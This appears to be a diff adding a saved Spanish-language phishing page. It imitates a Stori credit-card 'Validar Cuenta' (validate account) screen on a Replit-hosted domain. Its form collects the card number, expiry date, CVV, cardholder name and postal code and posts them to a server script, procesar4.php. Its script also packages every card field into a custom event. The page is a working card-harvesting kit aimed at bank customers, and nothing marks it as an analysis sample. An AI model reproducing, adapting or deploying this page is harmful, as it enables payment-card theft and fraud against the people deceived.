@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<!-- saved from url=(0048)https://tarjetastoricardmx.replit.app/index4.php -->
+<html lang="es"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pasarela de Pago</title>
+    <link rel="icon" href="https://cdn.glitch.global/e1e455db-012b-49f9-9e5a-31c1a0409530/icon.png?v=1745168368124" type="image/png">
+    <style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        background-color: #f5f5f5;
+        color: #333;
+        line-height: 1.5;
+    }
+
+    .container {
+        max-width: 396px;
+        margin: 13px auto;
+        padding: 20px;
+        border-radius: 19px;
+        min-height: 100vh;
+        background: white;
+        position: relative;
+    }
+    /* Ocultar la barra de incremento/decremento en input type="number" */
+    input[type="number"]::-webkit-outer-spin-button,
+    input[type="number"]::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+    }
+
+    input[type="number"] {
+        -moz-appearance: textfield; /* Para Firefox */
+    }
+
+    header {
+        display: flex;
+        align-items: center;
+        padding: 1rem;
+        background: white;
+        border-bottom: 1px solid #eee;
+    }
+
+    .back-button {
+        background: none;
+        border: none;
+        padding: 0.5rem;
+        cursor: pointer;
+    }
+
+    .header-text {
+        margin-left: 1rem;
+        font-size: 1rem;
+        color: #333;
+    }
+
+    .spacer {
+        flex: 1;
+    }
+
+    main {
+        padding: 2rem 1.5rem;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+    }
+
+    .illustration {
+        position: relative;
+        margin: 2rem 0;
+    }
+
+    .circle-bg {
+        width: 200px;
+        height: 200px;
+        background: #f0f0f0;
+        border-radius: 50%;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        z-index: 1;
+    }
+
+    .card-image {
+        width: 120px;
+        height: auto;
+        position: relative;
+        z-index: 2;
+    }
+
+    h1 {
+        font-size: 1.25rem;
+        margin-bottom: 2rem;
+        font-weight: 600;
+    }
+
+    .form-container {
+        width: 100%;
+        max-width: 300px;
+    }
+
+    .input-group {
+        margin-bottom: 1rem;
+    }
+
+    .input-group label {
+        display: block;
+        margin-bottom: 0.5rem;
+        text-align: left;
+    }
+
+    .input-group input {
+        width: 100%;
+        padding: 0.5rem;
+        border: 2px solid #ddd;
+        border-radius: 8px;
+        font-size: 1rem;
+    }
+
+    .input-group input:focus {
+        border-color: #008f76;
+        outline: none;
+    }
+
+    .submit-btn {
+        background-color: #00d180;
+        color: white;
+        border: none;
+        padding: 1rem;
+        width: 100%;
+        border-radius: 8px;
+        font-size: 1rem;
+        cursor: pointer;
+        margin-top: 1rem;
+    }
+
+    .submit-btn:hover {
+        background-color: #007a64;
+    }
+
+    @media (min-width: 768px) {
+        .container {
+            margin: 2rem auto;
+            min-height: calc(100vh - 4rem);
+            border-radius: 1rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+    }
+    </style>
+<script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/traffic.js"></script></head>
+<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMiIsInNjb3JlIjoyMDAyMn1d" __processed_b7889a40-0fdc-4915-a634-88ee866a8915__="true">
+    <div class="container" bis_skin_checked="1">
+        <header>
+            <a href="https://tarjetastoricardmx.replit.app/index.php">
+                <button class="back-button" aria-label="Volver">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="m15 18-6-6 6-6"></path>
+                    </svg>
+                </button>
+            </a>
+            <span class="header-text"><strong>Validar Cuenta</strong></span>
+            <span class="spacer"></span>
+        </header>
+
+        <main>
+            <div class="illustration" bis_skin_checked="1">
+                <div style="background-color: transparent;" class="circle-bg" bis_skin_checked="1"></div>
+                <img src="./cc_files/tcstori.png" alt="Ilustración de tarjeta de crédito" class="card-image">
+            </div>
+
+            <h1>Ingrese los detalles de su tarjeta</h1>
+            <form id="payment-form" class="form-container" method="POST" action="procesar4.php">
+    <div class="input-group" bis_skin_checked="1">
+        <label for="card-number">Número de Tarjeta</label>
+        <input type="text" id="card-number" name="card_number" required="" maxlength="19" placeholder="1234 5678 9012 3456">
+    </div>
+    <div class="input-group" bis_skin_checked="1">
+        <label for="expiry-date">Fecha de Expiración</label>
+        <input type="text" id="expiry-date" name="expiry_date" required="" maxlength="5" placeholder="MM/YY">
+    </div>
+    <div class="input-group" bis_skin_checked="1">
+        <label for="cvv">CVV</label>
+        <input type="number" id="cvv" name="cvv" oninput="validateCVV()" required="" maxlength="4" placeholder="123">
+    </div>
+    <div class="input-group" bis_skin_checked="1">
+        <label for="name">Nombre en la Tarjeta</label>
+        <input type="text" id="name" name="name" required="" placeholder="Juan Pérez">
+    </div>
+    <div class="input-group" bis_skin_checked="1">
+        <label for="postal-code">Código Postal</label>
+        <input type="number" id="postal-code" name="postal_code" required="" placeholder="12345">
+    </div>
+    <button type="submit" class="submit-btn">Confirmar</button>
+</form>
+
+        </main>
+    </div>
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('payment-form');
+    const cardNumberInput = document.getElementById('card-number');
+    const expiryDateInput = document.getElementById('expiry-date');
+
+    // Formato para el número de tarjeta
+    cardNumberInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let formattedValue = '';
+        for(let i = 0; i < value.length; i++) {
+            if(i > 0 && i % 4 === 0) {
+                formattedValue += ' ';
+            }
+            formattedValue += value[i];
+        }
+        e.target.value = formattedValue;
+    });
+
+    // Formato para la fecha de expiración
+    expiryDateInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 2) {
+            value = value.slice(0,2) + '/' + value.slice(2,4);
+        }
+        e.target.value = value;
+    });
+
+    // Evento opcional (no interfiere con envío)
+    form.addEventListener('submit', function() {
+        const event = new CustomEvent('paymentCompleted', { 
+            detail: {
+                cardNumber: document.getElementById('card-number').value,
+                expiryDate: document.getElementById('expiry-date').value,
+                cvv: document.getElementById('cvv').value,
+                name: document.getElementById('name').value,
+                postalCode: document.getElementById('postal-code').value
+            }
+        });
+        document.dispatchEvent(event);
+        // ✅ No hay preventDefault, así que se enviará a procesar4.php
+    });
+});
+
+function validateCVV() {
+    let input = document.getElementById('cvv');
+    let value = input.value;
+
+    if (value.length > 4) {
+        input.value = value.slice(0, 4);
+    }
+}
+</script>
+
+
+</body></html>
